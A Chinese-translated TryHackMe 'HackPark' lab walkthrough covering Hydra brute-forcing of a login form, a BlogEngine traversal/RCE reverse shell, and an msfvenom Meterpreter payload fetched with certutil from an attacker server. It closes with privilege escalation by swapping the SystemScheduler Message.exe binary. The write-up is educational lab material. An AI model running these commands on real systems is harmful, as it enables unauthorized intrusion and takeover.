<html>
<head>
<title>Hi, George! Do you want your shell back?</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">嗨，乔治！你想要回你的壳吗？</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hi-george-do-you-want-your-shell-back-9e373b67bcd1?source=collection_archive---------1-----------------------#2020-09-06">https://infosecwriteups.com/hi-george-do-you-want-your-shell-back-9e373b67bcd1?source=collection_archive---------1-----------------------#2020-09-06</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><h2 id="11ca" class="ir is it bd b dl iu iv iw ix iy iz dk ja translated" aria-label="kicker paragraph"><a class="ae ep" href="https://medium.com/@vadimpolovnikov" rel="noopener"> TryHackMe报道</a></h2><div class=""/><p id="1a5c" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">使用Metasploit、Msfvenom、Exploit-DB、PowerShell和RCE的HackPark教育演练。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi kx"><img src="../Images/6564b7c782e236b40b672ebf526268ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xVY-9rGQ8pavxIIq5cVJ6g.jpeg"/></div></div><figcaption class="lj lk gj gh gi ll lm bd b be z dk translated">检索自<a class="ae ln" href="https://www.pinterest.ca/pin/334251603576929403/" rel="noopener ugc nofollow" target="_blank"> Pinterest </a></figcaption></figure><p id="a246" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">嗨，你好！我很高兴您能和我一起进行这个小小的TryHackMe HackPack演练，毫无疑问，您将会找到您所寻求的东西，无论它是一个问题的解决方案还是看待事物的另一个角度。我们开始吧！</p></div><div class="ab cl lo lp hx lq" role="separator"><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt"/></div><div class="im in io ip iq"><h2 id="98a1" class="lv lw it bd lx ly lz dn ma mb mc dp md kk me mf mg ko mh mi mj ks mk ml mm iz bi translated">[任务1]部署易受攻击的Windows计算机</h2><p id="925d" class="pw-post-body-paragraph jz ka it kb b kc mn ke kf kg mo ki kj kk mp km kn ko mq kq kr ks mr ku kv kw im bi translated">我肯定你在哪里见过这个淘气的小丑…也许是在IT电影或者斯蒂夫·金的小说里。所以，就不要纠结这个了。</p><blockquote class="ms"><p id="e5d0" class="mt mu it bd mv mw mx my mz na nb kw dk translated">嗨，乔治！多漂亮的船啊。你想要回来吗？</p></blockquote></div><div class="ab cl lo lp hx lq" role="separator"><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt"/></div><div class="im in io ip iq"><h2 id="c88f" class="lv lw it bd lx ly lz dn ma mb mc dp md kk me mf mg ko mh mi mj ks mk ml mm iz bi translated">[任务2]使用Hydra强行登录</h2><p id="d005" class="pw-post-body-paragraph jz ka it kb b kc mn ke kf kg mo ki kj kk mp km kn ko mq kq kr ks mr ku kv kw im bi translated">在我们调查的最开始，最好开始Nmap扫描。所以，让我们开始吧！</p><p id="ec8d" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated"><code class="fe nc nd ne nf b">Nmap -sV -sC -sO &lt;IP-address&gt; -oN basic_scan.nmap</code></p><p id="00bb" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">基本上，这种扫描是对被称为侵略性的-A扫描的替代。但是，它缺少traceroute选项，这在这种情况下并不重要。让我们来看看结果。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi ng"><img src="../Images/980913f9cc7c3090dc0d24ba05dbcc9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*134YKD-on5FyEPJSj2LJBg.png"/></div></div></figure><p id="9f79" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">我们最感兴趣的部分是端口80。</p><blockquote class="nh ni nj"><p id="b6aa" class="jz ka nk kb b kc kd ke kf kg kh ki kj nl kl km kn nm kp kq kr nn kt ku kv kw im bi translated">在网站上搜索，点击一些链接，提交表单，后台运行一个Burp套件，这总是好的。这种方法被称为用户导向的爬行。它可能会显示一些隐藏的页面和功能。</p></blockquote><p id="4b9a" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">找到登录页面后，无论是通过浏览web应用程序还是使用GoBuster之类的自动化工具。请参见下面的命令:</p><p id="de60" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated"><code class="fe nc nd ne nf b">gobuster dir -u http://ip-addr -w /usr/share/wordlists/dirb/common.txt</code></p><p id="8059" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">GoBuster将在web服务器中寻找隐藏的目录。</p><p id="1a7d" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">登录页面没有透露任何关于用户名的线索，所以让我们把攻击目标转向“忘记密码了？”目标。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi no"><img src="../Images/2026cd3650338ba9ed021a471e5a2f90.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*grlOF1X2ODSnRn8fvk9q7g.png"/></div></div></figure><p id="be6f" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">用户名“admin”是黑客想到的第一个选项，也是导致这个错误的唯一用户名。让我们把它作为THC-Hydra的输入。</p><p id="6463" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">正如我前面所建议的，在浏览目标应用程序时运行Burp Suite是一个很好的实践。在这种情况下，它很有用，因为它显示了在登录页面提交的表单。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi np"><img src="../Images/6ce99af3648b5b66df79cdd7415fe328.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dSjOe00lbtZ_oM_TNcYFNA.png"/></div></div></figure><p id="8f49" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">VIEWSTATE字段告诉我们应用程序是在微软ASP.NET上编写的，为了破解密码，我们将使用整个表单作为hydra的<em class="nk"> http-post-form攻击</em>的参数。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi nq"><img src="../Images/ae19492f3de449cc6973c5e8d913dbe0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gjN5zSBjVHy4nOt0fx18rA.png"/></div></div></figure><p id="1a9d" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">我们唯一改变的是用户名和密码的占位符，分别替换为^USER^和^PASS^。在表单的最后，我们指定hydra应该停止搜索的时间——当它不再看到“登录失败”消息时。</p></div><div class="ab cl lo lp hx lq" role="separator"><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt"/></div><div class="im in io ip iq"><h2 id="0314" class="lv lw it bd lx ly lz dn ma mb mc dp md kk me mf mg ko mh mi mj ks mk ml mm iz bi translated">[任务3]损害机器</h2><p id="62d3" class="pw-post-body-paragraph jz ka it kb b kc mn ke kf kg mo ki kj kk mp km kn ko mq kq kr ks mr ku kv kw im bi translated">web应用程序爬行的另一个好的实践是探索HTML的源代码。如果你已经做过了，你可能已经回答了第一个问题。否则，只需转到“关于”页面。</p><p id="59d0" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">要找到我们需要的漏洞，您可以使用google搜索特定版本的BlogEngine并浏览在线漏洞数据库，或者使用<strong class="kb jd"> <em class="nk"> searchsploit </em> </strong>命令查询位于您的Kali Linux机器上的离线版本。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi nr"><img src="../Images/8309f78f049aa394fbe2633ce1fa5e32.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7Qw2g_7d1QSM9hboaxihmw.png"/></div></div></figure><p id="763a" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">对于这个挑战，我使用了“目录遍历/远程代码执行”漏洞(46353.cs ),因为作者在解释如何利用它并获得对目标的访问方面做了出色的工作。</p><p id="863f" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">要查看漏洞文件的内容，只需键入<strong class="kb jd"><em class="nk">searchsploit-x 46353 . cs</em></strong>。</p><p id="47eb" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">事不宜迟，让我们按照漏洞作者的说明获得访问权限。为了方便起见，我将它们写在下面:</p><ol class=""><li id="2d11" class="ns nt it kb b kc kd kg kh kk nu ko nv ks nw kw nx ny nz oa bi translated">打开漏洞文件，将<em class="nk"> TcpClient函数</em>中的IP地址和端口号(可选)更改为您的本地机器专用。关闭文件。</li><li id="6e4e" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">将文件重命名为PostView.ascx</li><li id="9238" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">使用您在漏洞利用文件(<strong class="kb jd"> <em class="nk"> nc -lvnp &lt;端口号&gt; </em> </strong>)中指定的端口启动NetCat监听器。</li><li id="5bad" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">导航到内容&gt;帖子&gt;欢迎使用HackPark，然后选择文件管理器图标。上传PostView.ascx文件。</li><li id="3c4d" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">打开说明中指定的链接(<em class="nk"> http://ip-address/？主题=../../App_Data/files </em>)并捕捉反向外壳。</li></ol><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi og"><img src="../Images/bd0a2f04f3ff86cce855f0aa0cbc0b69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ggIiY0gnD9z3Gm9gfQWNaw.png"/></div></div></figure></div><div class="ab cl lo lp hx lq" role="separator"><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt"/></div><div class="im in io ip iq"><h2 id="ef7e" class="lv lw it bd lx ly lz dn ma mb mc dp md kk me mf mg ko mh mi mj ks mk ml mm iz bi translated">[任务4] Windows权限提升</h2><p id="0d30" class="pw-post-body-paragraph jz ka it kb b kc mn ke kf kg mo ki kj kk mp km kn ko mq kq kr ks mr ku kv kw im bi translated">正如你所看到的，我们刚刚得到的外壳非常不稳定，这让我非常想念Meterpreter外壳。为什么我们不使用Msfvenom创建windows特定的Meterpreter有效负载，并获得所谓的类固醇外壳？！</p><p id="444c" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">该命令显示在下面的屏幕截图中:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi oh"><img src="../Images/63369f787cadc9ec3e2c34695c368adf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZauzVwKqrr-lpfnw4KcLvA.png"/></div></div></figure><p id="7364" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">细目分类:</p><blockquote class="nh ni nj"><p id="6068" class="jz ka nk kb b kc kd ke kf kg kh ki kj nl kl km kn nm kp kq kr nn kt ku kv kw im bi translated"><strong class="kb jd"> -p </strong> <em class="it">指定有效载荷(</em><strong class="kb jd">--list =有效载荷</strong> <em class="it">查看所有可用的有效载荷)</em></p><p id="206a" class="jz ka nk kb b kc kd ke kf kg kh ki kj nl kl km kn nm kp kq kr nn kt ku kv kw im bi translated"><strong class="kb jd"> lhost </strong> <em class="it"> —本地主机的IP地址</em></p><p id="c49a" class="jz ka nk kb b kc kd ke kf kg kh ki kj nl kl km kn nm kp kq kr nn kt ku kv kw im bi translated"><strong class="kb jd"> lport </strong> <em class="it"> —本地主机将在</em>上监听的端口号</p><p id="16f2" class="jz ka nk kb b kc kd ke kf kg kh ki kj nl kl km kn nm kp kq kr nn kt ku kv kw im bi translated"><strong class="kb jd"> -f </strong> <em class="it">是可执行文件</em>的文件类型</p></blockquote><p id="cc59" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">如果你想了解更多关于Msfvenom 的知识，这里有攻击性安全提供的教程链接。</p><p id="1f7b" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">现在，我们需要把这些有效载荷交给受害者。非常感谢<a class="ae ln" href="https://www.youtube.com/c/TheCyberMentor/featured" rel="noopener ugc nofollow" target="_blank">网络导师</a>提供了如何实际做到这一点的线索。我们将使用<a class="ae ln" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil" rel="noopener ugc nofollow" target="_blank">certutil.exe</a>程序，该程序通常使用证书操作，但也可用于文件传输。</p><p id="9207" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated"><code class="fe nc nd ne nf b">certutil.exe -urlcache -f <a class="ae ln" href="http://ip-address/ThePayload.exe" rel="noopener ugc nofollow" target="_blank">http://ip-addr/ThePayload.exe</a> ThePayload.exe</code></p><p id="b998" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">但是在执行这些命令之前，请转到目标机器上的<em class="nk"> C:\windows\temp </em>目录，并在您的有效负载所在的目录中本地启动HTTP服务器。让我们使用Python的SimpleHTTPServer。</p><blockquote class="nh ni nj"><p id="7ad6" class="jz ka nk kb b kc kd ke kf kg kh ki kj nl kl km kn nm kp kq kr nn kt ku kv kw im bi translated"><strong class="kb jd"><em class="it">python-m simple http server 80</em></strong></p></blockquote><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi oi"><img src="../Images/a44924b8b23767e7deb8ff639ed97bd7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8jZZ8vzU1BZldU-e78nMcg.png"/></div></div></figure><p id="7f9c" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">在有效负载执行之前，我们需要设置<a class="ae ln" href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit" rel="noopener ugc nofollow" target="_blank"> Metasploit处理程序</a>，以便检索Meterpreter反向shell。</p><ol class=""><li id="00aa" class="ns nt it kb b kc kd kg kh kk nu ko nv ks nw kw nx ny nz oa bi translated">通过发出msfconsole命令打开Metasploit终端。</li><li id="9c11" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">键入<strong class="kb jd"> <em class="nk">使用exploit/multi/handler </em> </strong>以打开处理程序模块。</li><li id="7a8d" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">选择我们已插入Msfvenom漏洞利用的有效负载— <strong class="kb jd"> <em class="nk">设置有效负载窗口/meter preter _ reverse _ TCP</em></strong>。</li><li id="512c" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">发出<strong class="kb jd"> <em class="nk">显示选项</em> </strong>命令，设置所需选项(LHOST，LPORT)。</li><li id="e897" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">运行漏洞利用(使用<strong class="kb jd"> <em class="nk">运行</em> </strong>或<strong class="kb jd"> <em class="nk">漏洞利用</em> </strong>命令)。</li></ol><p id="4c1d" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">一旦您在受害机器上运行ThePayload.exe，Meterpreter反向shell就会在本地主机上出现。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi oj"><img src="../Images/8d7ba603f8379922991acbc7916d8f00.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UwzduJ8BfFnku5ZO-RkVaw.png"/></div></div></figure><p id="182b" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">接下来，让我们看看目标服务器的系统规格。由于我们目前正在使用Meterpreter shell，您可以使用<strong class="kb jd"> <em class="nk"> sysinfo </em> </strong>命令。然而，由于我们将使用<a class="ae ln" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" rel="noopener ugc nofollow" target="_blank">Windows-Exploit-Suggester</a>，它需要Windows CLI的<strong class="kb jd"> <em class="nk"> systeminfo </em> </strong>命令的输出，所以让我们使用后一个选项并将其提供给建议者。</p><p id="41ca" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">* * *我不打算详述Windows-Exploit-Suggester的设置，但是如果你正在努力，请点击上面的链接。***</p><p id="c192" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">如果我们想通过使用Windows-Exploit-Suggester来检查系统是否易受攻击，我们需要将systeminfo命令的输出写入一个文件，并将其发送回我们的系统。就这么办吧！</p><ol class=""><li id="d4ce" class="ns nt it kb b kc kd kg kh kk nu ko nv ks nw kw nx ny nz oa bi translated">在Windows命令行输入<strong class="kb jd"><em class="nk">system info&gt;name of file . txt</em></strong></li><li id="c08b" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">在Meterpreter shell中找到该文件，并发出<strong class="kb jd"> <em class="nk">下载</em> </strong>命令将它放入我们的文件系统中。</li></ol><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi ok"><img src="../Images/e5893b7ba043fc98d4dfa4fad2197d19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Fqf1Bz83ucFAO4iTzvo_IQ.png"/></div></div></figure><p id="c8f1" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">下面是命令本身和输出，以及Python脚本能够找到的各种漏洞。</p><p id="5278" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">去追下一题！那台机器上运行的异常服务是什么？我们可以用<strong class="kb jd"> <em class="nk"> ps </em> </strong>命令检查当前的进程，或者在文件系统中搜索可疑的东西。最终，结果是服务<em class="nk">调度系统进程</em>并且它的目录位于程序文件(x86)中。</p><p id="e4c7" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">深入我们的假设并访问服务的目录，我们会遇到一些完全值得查看的日志文件。要回答这个问题并采取下一步行动，不要忘记检查那里的<em class="nk"> Events </em>目录和日志文件。</p><p id="a94a" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">为了进一步开发，我们需要知道更多关于这个调度服务的信息。值得庆幸的是，我们有Exploit-DB，它有一个具体的不是利用而是如何提升我们的特权的解释。下面是漏洞数据库的一个截图:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi ol"><img src="../Images/be561c075401758458305e4addc93595.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4ImSAjCqJZ7P9OiwwGvwTA.png"/></div></div></figure><p id="8d5f" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">现在，我们需要做的只是将ThePayload.exe漏洞重命名为Message.exe(<strong class="kb jd">记住我们在日志文件</strong>中看到的内容)并将其放入SystemScheduler目录，同时将原始可执行文件保存在不同的名称下(Message.bak)。就这么办吧！</p><ol class=""><li id="3770" class="ns nt it kb b kc kd kg kh kk nu ko nv ks nw kw nx ny nz oa bi translated">在Meterpreter — <strong class="kb jd"> <em class="nk">加载powershell </em> </strong>中加载PowerShell模块。</li><li id="d6a9" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">通过发出<strong class="kb jd"><em class="nk">powershell _ shell</em></strong>命令启动PS shell，并在<em class="nk"> \Temp </em>目录中找到自己。</li><li id="6a02" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">用下面的PS命令更改<em class="nk">ThePayload.exe</em>的名字:<strong class="kb jd"> <em class="nk">重命名-物品ThePayload.exe-新名称Message.exe</em></strong></li><li id="b2e2" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">用<strong class="kb jd"><em class="nk">Set-Location-Path " C:\ Program Files(x86)\ SystemScheduler "</em></strong>命令进入system scheduler目录，将原来的<em class="nk">Message.exe</em>的扩展名改为bak(文件的备份副本)。</li><li id="7369" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">用<strong class="kb jd"><em class="nk">Copy-Item-Path " C:\ Windows \ Temp \ message . exe "-Destination " C:\ Program Files(x86)\ SystemScheduler "</em></strong>将恶意的<em class="nk">Message.exe</em>文件复制到system scheduler目录下。</li><li id="b51d" class="ns nt it kb b kc ob kg oc kk od ko oe ks of kw nx ny nz oa bi translated">离开当前的Meterpreter会话并启动一个新的会话。等待弹出一个反壳。</li></ol><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi oj"><img src="../Images/33335cc27e4759573f5e7cc418e90b31.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*68WN73g-YBfDAXCl0UQ3zA.png"/></div></div></figure><p id="f52b" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">我们是管理员！从这一点，去追捕一些旗帜！</p></div><div class="ab cl lo lp hx lq" role="separator"><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt"/></div><div class="im in io ip iq"><h2 id="ebfe" class="lv lw it bd lx ly lz dn ma mb mc dp md kk me mf mg ko mh mi mj ks mk ml mm iz bi translated">[任务5]不使用Metasploit的权限提升</h2><p id="3b01" class="pw-post-body-paragraph jz ka it kb b kc mn ke kf kg mo ki kj kk mp km kn ko mq kq kr ks mr ku kv kw im bi translated">考虑到我们已经做了这么多，这个任务对你来说是小菜一碟。从TryHackMe中指定的链接下载winPEAS，并使用certutil.exe将其下拉到目标。观察输出并回答其余问题。</p></div><div class="ab cl lo lp hx lq" role="separator"><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt lu"/><span class="lr bw bk ls lt"/></div><div class="im in io ip iq"><p id="f503" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">感谢您参加这次TryHackMe骑行，我们下次挑战再见。黑客快乐！</p><p id="c256" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">如果你想看看我的其他文章，点击<strong class="kb jd">的链接</strong>(文章的第一行，就在标题上方)或者选择下面的一些。</p><div class="om on gp gr oo op"><a href="https://medium.com/bugbountywriteup/windows-privesc-or-how-to-crack-the-tryhackme-steel-mountain-machine-fdd7dc19ada3" rel="noopener follow" target="_blank"><div class="oq ab fo"><div class="or ab os cl cj ot"><h2 class="bd jd gy z fp ou fr fs ov fu fw jc bi translated">Windows PrivEsc或者如何破解TryHackMe钢山机。</h2><div class="ow l"><h3 class="bd b gy z fp ou fr fs ov fu fw dk translated">Metasploit、Exploit-DB、PowerShell等等。</h3></div><div class="ox l"><p class="bd b dl z fp ou fr fs ov fu fw dk translated">medium.com</p></div></div><div class="oy l"><div class="oz l pa pb pc oy pd lh op"/></div></div></a></div><div class="om on gp gr oo op"><a href="https://medium.com/@vadimpolovnikov/tryhackme-breaking-into-the-kenobi-machine-c569c4e2c625" rel="noopener follow" target="_blank"><div class="oq ab fo"><div class="or ab os cl cj ot"><h2 class="bd jd gy z fp ou fr fs ov fu fw jc bi translated">TryHackMe。闯入克诺比机器。</h2><div class="ow l"><h3 class="bd b gy z fp ou fr fs ov fu fw dk translated">这不仅仅是一个基本的演练，而是一个可以学习的资源。</h3></div><div class="ox l"><p class="bd b dl z fp ou fr fs ov fu fw dk translated">medium.com</p></div></div><div class="oy l"><div class="pe l pa pb pc oy pd lh op"/></div></div></a></div><div class="om on gp gr oo op"><a href="https://medium.com/@vadimpolovnikov/tryhackme-basic-pentesting-walkthrough-7817c719fd04" rel="noopener follow" target="_blank"><div class="oq ab fo"><div class="or ab os cl cj ot"><h2 class="bd jd gy z fp ou fr fs ov fu fw jc bi translated">TryHackMe基本测试演练。</h2><div class="ow l"><h3 class="bd b gy z fp ou fr fs ov fu fw dk translated">关于黑客的教育演练。</h3></div><div class="ox l"><p class="bd b dl z fp ou fr fs ov fu fw dk translated">medium.com</p></div></div><div class="oy l"><div class="pf l pa pb pc oy pd lh op"/></div></div></a></div></div></div>    
</body>
</html>